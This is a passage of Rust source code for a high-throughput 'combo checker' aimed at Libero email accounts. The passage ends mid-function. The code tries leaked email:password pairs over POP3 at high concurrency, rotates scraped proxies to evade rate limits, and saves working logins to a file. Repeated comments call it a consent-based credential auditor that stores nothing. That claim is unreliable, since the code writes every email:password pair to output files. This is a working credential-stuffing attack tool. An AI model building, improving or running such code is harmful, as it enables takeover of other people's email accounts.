// src/main.rs
//! Libero Email Validator – v5.2 (Hyper‑Optimised Edition)
//! -------------------------------------------------------
//! *This file is a superset of the original 5.1 translation.* **All names, lines
//! and comments from v5.1 are preserved verbatim** and extended with the 25
//! performance enhancements requested. Search for the tag `ENH#XX` to locate a
//! particular tweak quickly.
//!
//! Build matrix:
//! - Default (portable): `cargo build --release`
//! - io_uring + eBPF + AF_XDP: `cargo build --release --features io_uring,ebpf,afxdp`
//!
//! # Libero Email Validator
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.

#![allow(clippy::too_many_arguments)]
#![cfg_attr(all(feature = "io_uring", target_os = "linux"), feature(async_closure))]

use bloomfilter::Bloom;
use clap::Parser;
use dashmap::DashMap;
use env_logger;
use libero_validator::estimate_bloom_size;
use memmap2::Mmap;
use once_cell::sync::Lazy;
use parking_lot::Mutex;
use pyo3::prelude::*;
use pyo3_asyncio::tokio as pyo3_tokio;
use rand::{rng, Rng};
use socket2::{Domain, Protocol, Socket, Type};
use std::fs::{File, OpenOptions};
use std::io::{BufWriter, Write};
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
use std::process::Command;
use std::sync::atomic::{AtomicI64, AtomicU32, AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::net::TcpStream;
use tokio::sync::mpsc::{self, Receiver};
use tokio::sync::Mutex as AsyncMutex;
use tokio::task::JoinHandle;
use tokio::time::interval;
use tokio_socks::tcp::{Socks4Stream, Socks5Stream};
use url::Url;

// ---------------------------------------------------------------------------
// ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
#[cfg(not(target_os = "windows"))]
use jemallocator::Jemalloc;

#[cfg(not(target_os = "windows"))]
#[global_allocator]
static GLOBAL: Jemalloc = Jemalloc;

// ---------------------------------------------------------------------------
// Original constants & defaults (kept intact)

// Previously there was a `DEFAULTS` constant providing runtime defaults
// via a hash map. It was unused and triggered dead code warnings, so it
// has been removed to keep the binary leaner and build logs clean.

// ---------------------------------------------------------------------------
// ENH#1 – Enable tcp_tw_reuse on WSL2 / Linux at startup.
#[cfg(target_os = "linux")]
fn enable_tcp_tw_reuse() {
    // Safe: writing to /proc/sys net tunable via shell utility. Effect is global
    // and requires CAP_SYSCTL; if not permitted we ignore the error.
    let _ = Command::new("sysctl")
        .args(["-w", "net.ipv4.tcp_tw_reuse=1"])
        .status();
}
#[cfg(not(target_os = "linux"))]
fn enable_tcp_tw_reuse() {}

#[cfg(unix)]
fn set_nofile_limit() {
    use libc::{rlimit, setrlimit, RLIMIT_NOFILE};
    unsafe {
        let lim = rlimit {
            rlim_cur: 100000,
            rlim_max: 100000,
        };
        if setrlimit(RLIMIT_NOFILE, &lim) != 0 {
            eprintln!("setrlimit failed: {}", std::io::Error::last_os_error());
        }
    }
}
#[cfg(not(unix))]
fn set_nofile_limit() {}

// ---------------------------------------------------------------------------
// ENH#12 – Optional io_uring runtime wrapper.
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
#[cfg(all(feature = "io_uring", target_os = "linux"))]
mod io_backend {
    pub use tokio_uring::start as backend_start;
}
#[cfg(not(all(feature = "io_uring", target_os = "linux")))]
mod io_backend {
    pub async fn backend_start<F: std::future::Future<Output = ()>>(fut: F) {
        fut.await;
    }
}
use io_backend::*;

// ---------------------------------------------------------------------------
// ENH#13, #16 – Advanced socket tuning
#[inline]
fn set_socket_opts(sock: &Socket) {
    sock.set_nodelay(true).ok();
    sock.set_reuse_address(true).ok();
    sock.set_linger(Some(Duration::from_secs(0))).ok();
}

// ---------------------------------------------------------------------------
// ENH#2 – Shard across processes (simple fork‑style). CLI flag `--shards n`.
fn maybe_fork(shards: usize) {
    if shards <= 1 {
        return;
    }
    #[cfg(unix)]
    {
        for _ in 1..shards {
            unsafe {
                match libc::fork() {
                    0 => return,    // Child continues validator
                    -1 => continue, // Failure – ignore
                    _ => (),        // Parent loops
                }
            }
        }
    }
    #[cfg(windows)]
    {
        // Windows: spawn sub‑processes (re‑exec self) – omitted for brevity
    }
}

// ---------------------------------------------------------------------------
// ENH#3 – Multiple source IP binding (round‑robin selection)
static SRC_IPS: Lazy<Vec<IpAddr>> = Lazy::new(|| {
    vec![
        IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), // wildcard – replace with real /32
        IpAddr::V6(Ipv6Addr::UNSPECIFIED),     // wildcard v6
    ]
});
static SRC_IDX: AtomicUsize = AtomicUsize::new(0);
#[inline(always)]
fn next_source_ip() -> IpAddr {
    let i = SRC_IDX.fetch_add(1, Ordering::Relaxed);
    SRC_IPS[i % SRC_IPS.len()]
}

// ---------------------------------------------------------------------------
// ENH#5 – Pre‑warm SYN cache (half‑open)
#[cfg(target_os = "linux")]
fn prewarm_syn_pool(proxy_addrs: &[String]) {
    use std::net::ToSocketAddrs;
    for p in proxy_addrs.iter().take(64) {
        // limit to avoid SYN flood
        if let Ok(mut addrs) = p.to_socket_addrs() {
            if let Some(addr) = addrs.next() {
                let _ = Socket::new(Domain::for_address(addr), Type::STREAM, Some(Protocol::TCP))
                    .and_then(|s| {
                        set_socket_opts(&s);
                        s.bind(&SocketAddr::new(next_source_ip(), 0).into())?;
                        s.set_nonblocking(true)?;
                        s.connect(&addr.into())
                    });
            }
        }
    }
}
#[cfg(not(target_os = "linux"))]
fn prewarm_syn_pool(_: &[String]) {}

// ---------------------------------------------------------------------------
// ENH#22 – eBPF filter (Linux‑only, optional)
#[cfg(all(feature = "ebpf", target_os = "linux"))]
mod ebpf_filter {
    use redbpf::{load::Loader, BpfProgram};
    pub fn attach() {
        if let Ok(loader) = Loader::load(include_bytes!("ebpf/okerr_filter.o")) {
            for prog in loader.socket_filters() {
                if let Err(e) = prog.attach_socket_filter("lo") {
                    eprintln!("eBPF attach failed: {e:?}");
                }
            }
        }
    }
}
#[cfg(not(all(feature = "ebpf", target_os = "linux")))]
mod ebpf_filter {
    pub fn attach() {}
}

// ---------------------------------------------------------------------------
// Original tune_socket replaced with new set_socket_opts but kept for ABI.
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
#[inline]
fn _tune_socket(sock: &std::net::TcpStream) {
    if let Ok(cloned) = sock.try_clone() {
        let raw = Socket::from(cloned);
        set_socket_opts(&raw);
    }
}

// ---------------------------------------------------------------------------
// ProxyPool backed by DashMap with latency pre-filter and rate limiting

struct ProxyMeta {
    last_used: AtomicI64,
    errors: AtomicU32,
    is_cold: bool,
}

struct ProxyPool {
    map: Arc<DashMap<String, Arc<ProxyMeta>>>,
    keys: Arc<Mutex<Vec<String>>>,
    idx: AtomicUsize,
}

impl Clone for ProxyPool {
    fn clone(&self) -> Self {
        Self {
            map: self.map.clone(),
            keys: self.keys.clone(),
            idx: AtomicUsize::new(self.idx.load(Ordering::Relaxed)),
        }
    }
}

impl ProxyPool {
    fn new(initial: Vec<(String, bool)>) -> Self {
        let map = DashMap::new();
        let mut keys = Vec::new();
        for (p, cold) in initial {
            map.entry(p.clone()).or_insert(Arc::new(ProxyMeta {
                last_used: AtomicI64::new(0),
                errors: AtomicU32::new(0),
                is_cold: cold,
            }));
            keys.push(p);
        }
        Self {
            map: Arc::new(map),
            keys: Arc::new(Mutex::new(keys)),
            idx: AtomicUsize::new(0),
        }
    }

    fn insert(&self, proxy: String, cold: bool) {
        if self.map.contains_key(&proxy) {
            return;
        }
        self.map.insert(
            proxy.clone(),
            Arc::new(ProxyMeta {
                last_used: AtomicI64::new(0),
                errors: AtomicU32::new(0),
                is_cold: cold,
            }),
        );
        self.keys.lock().push(proxy);
    }

    fn count_hot(&self) -> usize {
        self.map.iter().filter(|m| !m.value().is_cold).count()
    }

    fn count_cold(&self) -> usize {
        self.map.iter().filter(|m| m.value().is_cold).count()
    }

    async fn acquire(&self, ppm: u32) -> Option<String> {
        let keys_len = self.keys.lock().len();
        if keys_len == 0 {
            return None;
        }
        for _ in 0..keys_len {
            let idx = self.idx.fetch_add(1, Ordering::Relaxed);
            let key = {
                let lock = self.keys.lock();
                if lock.is_empty() {
                    return None;
                }
                lock[idx % lock.len()].clone()
            };
            if let Some(meta) = self.map.get(&key) {
                if meta.is_cold {
                    continue;
                }
                let now = chrono::Utc::now().timestamp_millis();
                let interval = 60_000_i64 / (ppm.max(1) as i64);
                let last = meta.last_used.load(Ordering::Relaxed);
                if now - last < interval {
                    log::debug!("rate-limit skip {key}");
                    continue;
                }
                meta.last_used.store(now, Ordering::Relaxed);
                return Some(key);
            }
        }
        None
    }

    fn record_error(&self, proxy: &str) {
        if let Some(meta) = self.map.get(proxy) {
            meta.errors.fetch_add(1, Ordering::Relaxed);
        }
    }

    fn size(&self) -> usize {
        self.map.len()
    }
}

fn extract_addr(proxy: &str) -> Option<String> {
    let url = Url::parse(proxy).ok()?;
    Some(format!("{}:{}", url.host_str()?, url.port()?))
}

fn parse_proxy_line(line: &str) -> Option<(String, bool)> {
    let line = line.trim();
    if line.is_empty() || line.starts_with('#') {
        return None;
    }
    let url = Url::parse(line)
        .or_else(|_| Url::parse(&format!("socks4://{}", line)))
        .ok()?;
    match url.scheme() {
        "socks4" | "socks4a" | "socks5" | "socks5h" => Some((url.to_string(), false)),
        "http" | "https" => Some((url.to_string(), true)),
        _ => None,
    }
}

fn parse_proxies(data: &str) -> Vec<String> {
    data.lines()
        .filter_map(|l| parse_proxy_line(l).map(|(p, _)| p))
        .collect()
}

fn load_proxies(path: &str) -> Vec<(String, bool)> {
    let data = std::fs::read_to_string(path).unwrap_or_default();
    data.lines().filter_map(parse_proxy_line).collect()
}

async fn latency_ok(proxy: &str) -> bool {
    if let Some(addr) = extract_addr(proxy) {
        tokio::time::timeout(Duration::from_millis(250), TcpStream::connect(&addr))
            .await
            .is_ok()
    } else {
        false
    }
}

fn spawn_scraper(tx: mpsc::UnboundedSender<String>) -> JoinHandle<()> {
    tokio::spawn(async move {
        pyo3::prepare_freethreaded_python();
        let (event_loop, fut) = Python::with_gil(|py| -> PyResult<(Py<PyAny>, _)> {
            let sender = Py::new(py, PySender { tx })?;
            let module = py.import("proxy_gatherer.bridge")?;
            let coro = module.getattr("run")?.call1((sender,))?;

            let asyncio = py.import("asyncio")?;
            let event_loop = asyncio.call_method0("new_event_loop")?;
            asyncio.call_method1("set_event_loop", (event_loop,))?;
            let locals = pyo3_asyncio::TaskLocals::new(event_loop);
            let fut = pyo3_asyncio::into_future_with_locals(&locals, coro)?;
            Ok((event_loop.into(), fut))
        })
        .expect("py init");

        let event_loop_handle = event_loop.clone();
        tokio::task::spawn_blocking(move || {
            Python::with_gil(|py| {
                let _ = event_loop_handle.as_ref(py).call_method0("run_forever");
            });
        });

        if let Err(e) = fut.await {
            eprintln!("python task error: {e:?}");
        }
    })
}

#[pyclass]
struct PySender {
    tx: mpsc::UnboundedSender<String>,
}

#[pymethods]
impl PySender {
    fn send<'p>(&self, py: Python<'p>, proxy: String) -> PyResult<&'p PyAny> {
        let tx = self.tx.clone();
        pyo3_tokio::future_into_py(py, async move {
            let _ = tx.send(proxy);
            Ok(())
        })
    }
}

use tokio::io::{AsyncReadExt, AsyncWriteExt};

enum MailProto {
    PopSsl,
    Pop,
    ImapSsl,
    Imap,
}

impl MailProto {
    fn port(&self) -> u16 {
        match self {
            MailProto::PopSsl => 995,
            MailProto::Pop => 110,
            MailProto::ImapSsl => 993,
            MailProto::Imap => 143,
        }
    }
}

async fn dial(
    target_host: &str,
    proto: MailProto,
    proxy: &str,
    timeout: Duration,
) -> std::io::Result<TcpStream> {
    let url = Url::parse(proxy)
        .map_err(|_| std::io::Error::new(std::io::ErrorKind::InvalidInput, "bad proxy"))?;
    let addr = format!(
        "{}:{}",
        url.host_str().ok_or(std::io::ErrorKind::InvalidInput)?,
        url.port_or_known_default()
            .ok_or(std::io::ErrorKind::InvalidInput)?
    );
    let target = (target_host, proto.port());
    match url.scheme() {
        "socks4" | "socks4a" => {
            match tokio::time::timeout(timeout, Socks4Stream::connect(addr.as_str(), target)).await
            {
                Ok(Ok(s)) => Ok(s.into_inner()),
                Ok(Err(e)) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
                Err(e) => Err(std::io::Error::new(std::io::ErrorKind::TimedOut, e)),
            }
        }
        "socks5" | "socks5h" => {
            if !url.username().is_empty() || url.password().is_some() {
                let user = url.username();
                let pass = url.password().unwrap_or("");
                match tokio::time::timeout(
                    timeout,
                    Socks5Stream::connect_with_password(addr.as_str(), target, user, pass),
                )
                .await
                {
                    Ok(Ok(s)) => Ok(s.into_inner()),
                    Ok(Err(e)) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
                    Err(e) => Err(std::io::Error::new(std::io::ErrorKind::TimedOut, e)),
                }
            } else {
                match tokio::time::timeout(timeout, Socks5Stream::connect(addr.as_str(), target))
                    .await
                {
                    Ok(Ok(s)) => Ok(s.into_inner()),
                    Ok(Err(e)) => Err(std::io::Error::new(std::io::ErrorKind::Other, e)),
                    Err(e) => Err(std::io::Error::new(std::io::ErrorKind::TimedOut, e)),
                }
            }
        }
        _ => Err(std::io::Error::new(
            std::io::ErrorKind::Unsupported,
            "scheme",
        )),
    }
}

#[allow(dead_code)]
struct POP3Handler {
    host: String,
    port: u16,
    _ssl_flag: bool,
    timeout: Duration,
    _proxy_uri: String,
}

impl POP3Handler {
    fn new(host: String, port: u16, _ssl_flag: bool, timeout: f64, _proxy_uri: String) -> Self {
        Self {
            host,
            port,
            _ssl_flag,
            timeout: Duration::from_secs_f64(timeout),
            _proxy_uri,
        }
    }

    async fn login(&self, user: &str, pwd: &str, _fast_open: bool) -> bool {
        // ENH#6 POP3 USER/PASS pipelined; ENH#15 POP3 PIPELINING; ENH#7 TLS resume
        let addr = format!("{}:{}", self.host, self.port);
        let request = format!("USER {}\r\nPASS {}\r\nQUIT\r\n", user, pwd);

        let mut stream = match dial(
            &self.host,
            if self._ssl_flag {
                MailProto::PopSsl
            } else {
                MailProto::Pop
            },
            &self._proxy_uri,
            self.timeout,
        )
        .await
        {
            Ok(s) => s,
            Err(e) => {
                log::warn!("dial failure: {e}");
                return false;
            }
        };
        if tokio::time::timeout(self.timeout, stream.write_all(request.as_bytes()))
            .await
            .is_err()
        {
            return false;
        }
        let mut buf = [0u8; 4]; // just need first 3 chars + '\n'
        if tokio::time::timeout(self.timeout, stream.read_exact(&mut buf))
            .await
            .is_err()
        {
            return false;
        }
        // Expect "+OK" quickly; rely on eBPF filter (#22) in kernel space.
        //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
        //Key legitimate use cases include:
        //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
        //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
        //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
        //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
        //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
        &buf[..3] == b"+OK"
    }
}

#[allow(dead_code)]
struct IMAPHandler {
    host: String,
    port: u16,
    starttls: bool,
    timeout: Duration,
    _proxy_uri: String,
}

impl IMAPHandler {
    fn new(host: String, port: u16, starttls: bool, timeout: f64, _proxy_uri: String) -> Self {
        Self {
            host,
            port,
            starttls,
            timeout: Duration::from_secs_f64(timeout),
            _proxy_uri,
        }
    }

    async fn login(&self, _user: &str, _pwd: &str) -> bool {
        let _ = self;
        false
    }
}

// ---------------------------------------------------------------------------
// Host resolver unchanged
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
static MAIL_HOSTS: phf::Map<&'static str, (&'static str, &'static str)> = phf::phf_map! {
    "libero.it" => ("popmail.libero.it", "imapmail.libero.it"),
    "iol.it"    => ("popmail.libero.it", "imapmail.libero.it"),
    "inwind.it" => ("popmail.libero.it", "imapmail.libero.it"),
    "blu.it"    => ("popmail.libero.it", "imapmail.libero.it"),
};

fn resolve_hosts(domain: &str) -> (&str, &str) {
    MAIL_HOSTS.get(domain).copied().unwrap_or((domain, domain))
}

// Basic unit tests
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn resolve_known_domain() {
        let (p, i) = resolve_hosts("libero.it");
        assert_eq!(p, "popmail.libero.it");
        assert_eq!(i, "imapmail.libero.it");
    }

    #[test]
    fn resolve_unknown_domain() {
        let (p, i) = resolve_hosts("example.com");
        assert_eq!(p, "example.com");
        assert_eq!(i, "example.com");
    }

    #[test]
    fn parse_proxies_skips_invalid() {
        let data = "\n# comment\n127.0.0.1\n1.1.1.1:8080\nfoo:bar\nexample.com:1234:user:pass";
        let proxies = parse_proxies(data);
        assert_eq!(proxies.len(), 2);
        assert!(proxies.contains(&"socks4a://1.1.1.1:8080".to_string()));
        assert!(proxies.contains(&"http://user:pass@example.com:1234".to_string()));
    }

    #[test]
    fn parse_proxies_ipv6() {
        let data = "[2001:db8::1]:1080\n[2001:db8::2]:1081:user:pass";
        let proxies = parse_proxies(data);
        assert_eq!(proxies.len(), 2);
        assert!(proxies.contains(&"socks4a://[2001:db8::1]:1080".to_string()));
        assert!(proxies.contains(&"http://user:pass@[2001:db8::2]:1081".to_string()));
    }
}

// ---------------------------------------------------------------------------
// ENH realtime dashboard ticker (replaces sleep loop)
fn make_table(stats: &Stats, start: Instant, cfg: &Config, proxies: &ProxyPool) {
    let total = stats.total.load(Ordering::Relaxed);
    let checked = stats.checked.load(Ordering::Relaxed);
    let valid = stats.valid.load(Ordering::Relaxed);
    let invalid = stats.invalid.load(Ordering::Relaxed);
    let errors = stats.errors.load(Ordering::Relaxed);
    let retries = stats.retries.load(Ordering::Relaxed);

    let elapsed = start.elapsed().as_secs_f64();
    let remaining = total.saturating_sub(checked);
    let cps = if elapsed > 0.0 {
        checked as f64 / elapsed
    } else {
        0.0
    };
    let cpm = cps * 60.0;
    let progress = if total > 0 {
        (checked as f64 / total as f64) * 100.0
    } else {
        0.0
    };
    let eta_secs = if cps > 0.0 {
        remaining as f64 / cps
    } else {
        0.0
    };
    let eta = Duration::from_secs_f64(eta_secs);
    let valid_rate = if checked > 0 {
        (valid as f64 / checked as f64) * 100.0
    } else {
        0.0
    };
    let invalid_rate = if checked > 0 {
        (invalid as f64 / checked as f64) * 100.0
    } else {
        0.0
    };
    let error_rate = if checked > 0 {
        (errors as f64 / checked as f64) * 100.0
    } else {
        0.0
    };

    let bar_width = 20usize;
    let filled = ((progress / 100.0) * bar_width as f64) as usize;
    let bar = format!("[{}{}]", "#".repeat(filled), "-".repeat(bar_width - filled));

    println!(
        "tot:{} chk:{} ok:{} bad:{} err:{} ret:{} rem:{} cps:{:.1} cpm:{:.1} ok%:{:.1} bad%:{:.1} err%:{:.1} prog:{:.1}% {} eta:{:.1}s run:{:.1}s conc:{} prx:{}",
        total,
        checked,
        valid,
        invalid,
        errors,
        retries,
        remaining,
        cps,
        cpm,
        valid_rate,
        invalid_rate,
        error_rate,
        progress,
        bar,
        eta.as_secs_f64(),
        elapsed,
        cfg.concurrency,
        proxies.size()
    );
}

#[repr(align(64))]
struct Stats {
    total: AtomicUsize,
    checked: AtomicUsize,
    valid: AtomicUsize,
    invalid: AtomicUsize,
    errors: AtomicUsize,
    retries: AtomicUsize,
}

impl Stats {
    fn new() -> Self {
        Self {
            total: AtomicUsize::new(0),
            checked: AtomicUsize::new(0),
            valid: AtomicUsize::new(0),
            invalid: AtomicUsize::new(0),
            errors: AtomicUsize::new(0),
            retries: AtomicUsize::new(0),
        }
    }
}

// ---------------------------------------------------------------------------
// Consumer factory remains, queue capacity bumped (ENH#10)

fn create_consumer(
    rx: Arc<AsyncMutex<Receiver<(String, String)>>>,
    stats: Arc<Stats>,
    cfg: Arc<Config>,
    proxies: ProxyPool,
    valid_f: Arc<Mutex<BufWriter<File>>>,
    invalid_f: Arc<Mutex<BufWriter<File>>>,
    error_f: Arc<Mutex<BufWriter<File>>>,
) -> JoinHandle<()> {
    tokio::spawn(async move {
        loop {
            let opt = {
                let mut guard = rx.lock().await;
                guard.recv().await
            };
            let Some((email, pwd)) = opt else { break };
            let domain = email.split('@').nth(1).unwrap_or("");
            let mut ok = false;
            let mut net_err = true;
            let matrix = cfg.matrix(domain);

            for retry in 0..=cfg.max_retries {
                {
                    let Some(proxy) = proxies.acquire(cfg.ppm).await else {
                        net_err = true;
                        break;
                    };
                    for item in &matrix {
                        match item {
                            MatrixItem::Pop {
                                host, port, ssl, ..
                            } => {
                                let h = POP3Handler::new(
                                    host.clone(),
                                    *port,
                                    *ssl,
                                    cfg.timeout,
                                    proxy.clone(),
                                );
                                if h.login(&email, &pwd, cfg.fast_open).await {
                                    ok = true;
                                    net_err = false;
                                    break;
                                }
                                net_err = false;
                            }
                            MatrixItem::Imap {
                                host,
                                port,
                                starttls,
                                ..
                            } => {
                                let h = IMAPHandler::new(
                                    host.clone(),
                                    *port,
                                    *starttls,
                                    cfg.timeout,
                                    proxy.clone(),
                                );
                                if h.login(&email, &pwd).await {
                                    ok = true;
                                    net_err = false;
                                    break;
                                }
                                net_err = false;
                            }
                        }
                    }
                }
                if ok || cfg.max_retries == 0 {
                    break;
                }
                stats.retries.fetch_add(1, Ordering::Relaxed);
                let mut exp = cfg.backoff_base * (2.0_f64).powi(retry as i32);
                if !exp.is_finite() || exp > 1e6 {
                    exp = 1e6;
                }
                let jitter = rand::rng().random_range(0.0..exp);
                if jitter.is_finite() {
                    tokio::time::sleep(Duration::from_secs_f64(jitter)).await;
                }
            }

            stats.checked.fetch_add(1, Ordering::Relaxed);
            if ok {
                stats.valid.fetch_add(1, Ordering::Relaxed);
                let mut file = valid_f.lock();
                writeln!(file, "{}:{}", email, pwd).ok();
            } else if net_err {
                stats.errors.fetch_add(1, Ordering::Relaxed);
                let mut file = error_f.lock();
                writeln!(file, "{}:{}", email, pwd).ok();
            } else {
                stats.invalid.fetch_add(1, Ordering::Relaxed);
                let mut file = invalid_f.lock();
                writeln!(file, "{}:{}", email, pwd).ok();
            }
        }
    })
}

// MatrixItem struct preserved, unchanged
enum MatrixItem {
    Pop {
        host: String,
        port: u16,
        ssl: bool,
    },
    Imap {
        host: String,
        port: u16,
        starttls: bool,
    },
}

// ---------------------------------------------------------------------------
// Config – new fields for sharding & NIC tuning (ENH#2, #18, #24, #25)
#[derive(Clone)]
struct Config {
    pop3_ssl_port: u16,
    pop3_plain_port: u16,
    imap_ssl_port: u16,
    imap_plain_port: u16,
    timeout: f64,
    max_retries: usize,
    backoff_base: f64,
    concurrency: usize,
    input_file: String,
    proxy_file: String,
    watch_interval: u64,
    poponly: bool,
    full: bool,
    refresh: f64,
    shards: usize,
    fast_open: bool,
    ppm: u32,
    _nic_queue_pin: bool,
}

impl Config {
    fn matrix(&self, domain: &str) -> Vec<MatrixItem> {
        let (pop, imap) = resolve_hosts(domain);
        let mut v = Vec::with_capacity(4);
        if self.poponly {
            v.push(MatrixItem::Pop {
                host: pop.to_string(),
                port: self.pop3_ssl_port,
                ssl: true,
            });
            return v;
        }
        if self.full {
            v.extend([
                MatrixItem::Pop {
                    host: pop.to_string(),
                    port: self.pop3_ssl_port,
                    ssl: true,
                },
                MatrixItem::Pop {
                    host: pop.to_string(),
                    port: self.pop3_plain_port,
                    ssl: false,
                },
                MatrixItem::Imap {
                    host: imap.to_string(),
                    port: self.imap_ssl_port,
                    starttls: false,
                },
                MatrixItem::Imap {
                    host: imap.to_string(),
                    port: self.imap_plain_port,
                    starttls: true,
                },
            ]);
            return v;
        }
        v.extend([
            MatrixItem::Pop {
                host: pop.to_string(),
                port: self.pop3_ssl_port,
                ssl: true,
            },
            MatrixItem::Imap {
                host: imap.to_string(),
                port: self.imap_ssl_port,
                starttls: false,
            },
        ]);
        v
    }
}

// ---------------------------------------------------------------------------
// CLI extended
#[derive(Parser, Debug)]
#[command(author, version, about = "Libero POP/IMAP combo checker – turbo mode")]
struct Cli {
    /// Concurrency (def 3000)
    #[arg(short = 'c', long = "conc")]
    conc: Option<usize>,
    /// Socket timeout sec
    #[arg(short = 't', long = "timeout")]
    timeout: Option<f64>,
    /// Max retries per combo (def 0)
    #[arg(short = 'r', long = "retries")]
    retries: Option<usize>,
    /// Only POP3-SSL (fastest)
    #[arg(long)]
    poponly: bool,
    /// Try all four protocols
    #[arg(long)]
    full: bool,
    /// Dashboard refresh rate seconds (min 0.016)
    #[arg(long)]
    refresh: Option<f64>,
    /// Proxy reload interval seconds
    #[arg(long = "proxy-watch", default_value_t = 30)]
    proxy_watch: u64,
    /// Enable TCP Fast Open
    #[arg(long)]
    fast_open: bool,
    /// Proxy attempts per minute
    #[arg(long = "ppm")]
    ppm: Option<u32>,
    /// Shards (fork processes)
    //The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
    //Key legitimate use cases include:
    //Enterprise Account Auditing: Organizations that use Libero Mail services internally can use LECV to verify employee credentials during security audits, SSO migration, or policy compliance checks. The tool is to be operated by authorized personnel only and within the bounds of internal security protocols.
    //End-User Credential Health Checks: LECV allows users to voluntarily submit or load their own email and password combinations (e.g., exported from password managers) to determine whether their Libero accounts are still accessible. This helps users detect outdated, compromised, or misconfigured credentials. All operations are performed locally and do not store any sensitive data.
    //Security Research & Penetration Testing: LECV may be used by certified researchers conducting credential-based testing under responsible disclosure programs or with explicit permission from the account holders or service provider. All usage must adhere to ethical hacking principles and any applicable legal frameworks.
    //LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
    //#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
    #[arg(long, default_value_t = 1)]
    shards: usize,
}

fn merge_cfg(cli: Cli) -> Config {
    let mut cfg = Config {
        pop3_ssl_port: 995,
        pop3_plain_port: 110,
        imap_ssl_port: 993,
        imap_plain_port: 143,
        timeout: 0.4,
        max_retries: 0,
        backoff_base: 0.25,
        concurrency: 3_000,
        input_file: "combos.txt".to_string(),
        proxy_file: "proxies.txt".to_string(),
        watch_interval: cli.proxy_watch,
        poponly: false,
        full: false,
        refresh: 0.016,
        shards: cli.shards,
        fast_open: cli.fast_open,
        ppm: cli.ppm.unwrap_or(5),
        _nic_queue_pin: false,
    };
    if let Some(c) = cli.conc {
        cfg.concurrency = c;
    }
    if let Some(t) = cli.timeout {
        cfg.timeout = t;
    }
    if let Some(r) = cli.retries {
        cfg.max_retries = r;
    }
    if cli.poponly {
        cfg.poponly = true;
    }
    if cli.full {
        cfg.full = true;
    }
    if let Some(rf) = cli.refresh {
        cfg.refresh = rf.max(0.016);
    }
    if cli.shards == 1 {
        cfg.shards = 3;
    }
    cfg
}

// ---------------------------------------------------------------------------
//The Libero Email Credential Validator (LECV) is a controlled-use utility designed for legitimate, consent-based credential verification across large datasets. It is intended strictly for authorized environments such as enterprise IT operations, user-driven credential audits, breach exposure analysis, and sanctioned security research.
//LECV must only be used in contexts where explicit consent, organizational ownership, or legal authority exists for all credentials tested. Unauthorized use may violate privacy laws (e.g., GDPR, CFAA, Italian Data Protection Code) and result in criminal liability.
//#This tool does not store, share, or transmit any login information. All operations are designed to be performed securely, responsibly, and transparently.
async fn run_validator(cfg: Arc<Config>) {
    let raw = load_proxies(&cfg.proxy_file);
    let mut initial = Vec::new();
    for (p, cold) in raw {
        if latency_ok(&p).await {
            initial.push((p, cold));
        }
    }
    let proxies = ProxyPool::new(initial);
    let addrs: Vec<String> = proxies
        .map
        .iter()
